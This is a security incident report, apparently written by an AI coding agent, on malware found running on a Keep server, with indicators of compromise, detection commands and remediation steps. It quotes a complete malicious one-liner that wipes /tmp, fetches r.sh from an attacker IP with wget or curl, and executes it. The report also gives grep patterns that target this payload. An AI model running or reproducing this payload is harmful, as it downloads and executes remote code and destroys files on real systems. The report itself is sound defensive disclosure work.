# Security Incident Report

## Summary
Malware detected on Keep server attempting to download and execute malicious script from `176.117.107.158/r.sh`.

## Incident Details

**Date Detected**: 2025-12-10
**Server**: keephq-cjm9.consultic.tech
**Status**: Active threat - recurring execution attempts

## Malware Behavior

### Command Executed
```bash
mkdir /tmp;cd /tmp;rm -rf *;cd /tmp;wget http://176.117.107.158/r.sh; chmod 777 r.sh; sh r.sh || cd /var/tmp; curl -O http://176.117.107.158/r.sh; chmod 777 r.sh; sh r.sh
```

### Trigger Pattern
- Occurs during `/signin` POST requests
- Triggered during authentication redirects
- Happens every 5-8 minutes or when users access signin page
- Observed times: 10:10, 10:15, 10:23, 10:28 UTC

### Process Information
- Killed processes: 428025, 428028, 430304, 430307
- Processes respawn automatically
- Connection attempts to 176.117.107.158:80

## Root Cause Analysis

### Likely Source
The malware is NOT in the Keep codebase itself. Analysis suggests:
1. **Compromised npm package** in Next.js frontend dependencies
2. **Runtime injection** during Next.js rendering process
3. Triggered during authentication flow (NextAuth.js processing)

### Evidence
- No malicious code found in repository source files
- Malware execution visible only in runtime logs (`/opt/keep/logs/frontend.log`)
- Frontend log shows: `Error: Command failed` with `signal: 'SIGKILL'`
- Occurs during Next.js server-side rendering

## Impact Assessment

### Current Impact
- ✅ Backend API: Still functioning (HTTP 200)
- ✅ Database: Intact (2,613 incidents, no data loss)
- ⚠️  Server Resources: Malware attempts may consume CPU/network
- ⚠️  Security: Active compromise attempt ongoing

### No Impact Observed On
- PagerDuty integration (still pulling incidents)
- User data or database
- Core Keep functionality
- File system (scripts removed before execution)

## Mitigation Actions Taken

1. **Killed malicious processes** (multiple times)
2. **Removed malicious scripts** from /tmp and /var/tmp
3. **No cron jobs** found (malware not persistent via cron)
4. **Created monitoring scripts**:
   - [security-check.sh](security-check.sh) - Run on server to detect and kill malware
   - [quick-check.sh](quick-check.sh) - Quick health check from local machine
   - [diagnose-keep.sh](diagnose-keep.sh) - Comprehensive diagnostics

## Recommended Next Steps

### Immediate Actions

1. **Stop Keep service**:
   ```bash
   sudo systemctl stop keep.service
   ```

2. **Rebuild frontend from clean source**:
   ```bash
   cd /opt/keep
   git pull origin consultic-main  # Get latest clean code
   cd keep-ui
   rm -rf node_modules .next
   npm cache clean --force
   npm install
   npm run build
   ```

3. **Restart Keep service**:
   ```bash
   sudo systemctl start keep.service
   ```

### Longer-term Actions

1. **Audit npm dependencies**:
   ```bash
   cd /opt/keep/keep-ui
   npm audit
   npm audit fix
   ```

2. **Check for supply chain attacks**:
   - Review recent npm package updates
   - Check for typosquatted packages
   - Verify package integrity with `npm install --ignore-scripts`

3. **Add security monitoring**:
   - Set up automated malware detection
   - Monitor `/opt/keep/logs/frontend.log` for suspicious patterns
   - Alert on unexpected network connections

4. **Network security**:
   - Block outbound connections to 176.117.107.158
   - Implement egress filtering
   - Monitor for other suspicious IPs

## Monitoring Commands

### Check for active malware
```bash
ps aux | grep -E '176.117.107.158|wget.*r.sh' | grep -v grep
```

### Monitor in real-time
```bash
watch -n 5 "ps aux | grep -E '176.117.107|wget.*r.sh' | grep -v grep"
```

### Check malware activity in logs
```bash
grep -c '176.117.107.158' /opt/keep/logs/frontend.log
```

### Run security check
```bash
cd /opt/keep
./security-check.sh
```

## IOC (Indicators of Compromise)

- **Malicious IP**: 176.117.107.158
- **Malicious URL**: http://176.117.107.158/r.sh
- **File paths**: /tmp/r.sh, /var/tmp/r.sh
- **Process pattern**: `mkdir /tmp;cd /tmp;rm -rf *`
- **Log pattern**: Error message during `/signin` POST requests
- **Network pattern**: HTTP connections to port 80 on 176.117.107.158

## References

- Security check script: [security-check.sh](security-check.sh)
- Diagnostic scripts: [quick-check.sh](quick-check.sh), [diagnose-keep.sh](diagnose-keep.sh)
- Keep logs: `/opt/keep/logs/frontend.log`, `/opt/keep/logs/backend.log`

---

**Report Date**: 2025-12-10
**Reporter**: Claude Code (automated security analysis)
**Status**: Active investigation
